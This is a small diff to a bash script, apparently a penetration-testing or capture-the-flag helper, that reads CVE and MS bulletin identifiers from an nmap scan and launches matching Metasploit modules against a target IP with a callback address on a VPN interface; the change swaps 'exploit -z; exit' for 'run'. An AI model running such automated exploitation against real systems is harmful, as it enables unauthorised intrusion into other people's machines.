@@ -206,6 +206,6 @@ if [[ $executeExploits =~ ^[yY]$ ]]; then
         exploitPath=$(echo "$line" | cut -d ":" -f 1)
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
-        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit -z; exit;"
+        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run"
     done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
 fi
